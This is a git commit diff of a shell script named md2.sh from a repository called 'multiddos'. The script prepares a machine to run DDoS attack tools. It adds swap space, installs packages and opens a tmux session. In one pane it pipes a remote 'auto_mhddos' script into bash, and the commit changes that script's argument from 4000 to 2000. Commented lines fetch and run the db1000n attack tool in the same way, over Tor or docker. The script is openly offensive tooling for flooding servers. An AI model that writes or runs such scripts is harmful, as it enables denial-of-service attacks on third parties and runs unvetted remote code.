197c8b6516d567b29441707533a684489adf9dcf
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-12 13:38:16 +0300

    Update md2.sh

--- md2.sh
+++ md2.sh
@@ -1,8 +1,10 @@
 #!/bin/bash
 # curl -s https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh -o md2.sh && bash md2.sh
 sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
-sudo apt-get update -y
-sudo apt-get install -y tmux torsocks vnstat fish python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
+sudo apt update -y
+sudo apt install -y tmux vnstat python3 python3-pip
+# sudo apt install torsocks fish
+# sudo apt instal gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
 # install docker
 #sudo apt install apt-transport-https ca-certificates curl software-properties-common
@@ -10,7 +12,7 @@ pip install --upgrade pip
 #sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
 #sudo apt install docker-ce -y
 
-chsh -s /usr/bin/fish
+#chsh -s /usr/bin/fish
 tmux kill-session -t multiddos; sudo pkill node
 #tmux mouse support
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
@@ -30,7 +32,7 @@ tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 0.1
 tmux split-window -v 'vnstat -l'
 sleep 0.1
-tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash -s -- 4000'
+tmux split-window -v 'curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/test.sh | bash -s -- 2000'
 #sleep 0.1
 #tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
